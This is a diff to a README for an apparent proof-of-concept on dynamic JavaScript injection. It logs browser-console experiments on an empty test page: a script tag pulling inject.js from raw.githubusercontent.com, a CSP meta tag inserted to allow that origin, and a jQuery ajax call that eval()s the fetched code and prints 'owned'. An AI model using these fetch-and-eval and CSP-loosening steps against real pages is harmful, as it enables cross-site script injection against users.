@@ -5,6 +5,7 @@ This project is a prof-og-concept of dynamic Javascript libraries injection for 
 The target page must hace JQuery libraries activated
 
 ## Target paget
+
 We will use an empty HTML page to host our injection
 
 ```html
@@ -42,7 +43,9 @@ https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js
 ```
 
 # First try (Brave)
+
 we execute in console:
+
 ```javascript
 function inject() {
     var script = document.createElement("script");
@@ -54,6 +57,7 @@ inject()
 ```
 
 ### Result:
+
 ```
 VM304:6 Cross-Origin Read Blocking (CORB) blocked cross-origin response https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js with MIME type text/plain. See https://www.chromestatus.com/feature/5629709824032768 for more details.
 ```
@@ -62,7 +66,7 @@ VM304:6 Cross-Origin Read Blocking (CORB) blocked cross-origin response https://
 
 We execute in console
 
-```
+```javascript
 function dynamicallyInsertCSP() {
         let metaElement = document.createElement("meta");
         metaElement.setAttribute("content", "default-src 'self' 'unsafe-inline' *.githubusercontent.com;")
@@ -71,6 +75,14 @@ function dynamicallyInsertCSP() {
 };
 
 dynamicallyInsertCSP();
+
+function inject() {
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js";
+    document.head.appendChild(script);
+}
+inject()
 ```
 
 And we check we have this tag at the HEAD:
@@ -80,3 +92,26 @@ And we check we have this tag at the HEAD:
 ```
 
 But when executing injection we get the same result
+
+## Third try. Import as text
+
+The are a lot of restrictions about importing JavaScript code into current page. It seems that including some "Same-Origin" from the server would help us, but let's try another ways involving only client.
+
+```javascript
+$.ajax({
+    url:'https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js',
+    success: function (data){
+        eval(data);
+      //parse your data here
+      //you can split into lines using data.split('\n') 
+      //an use regex functions to effectively parse it
+    }
+  });
+```
+
+in this case we get the console message:
+
+```
+owned
+```
+
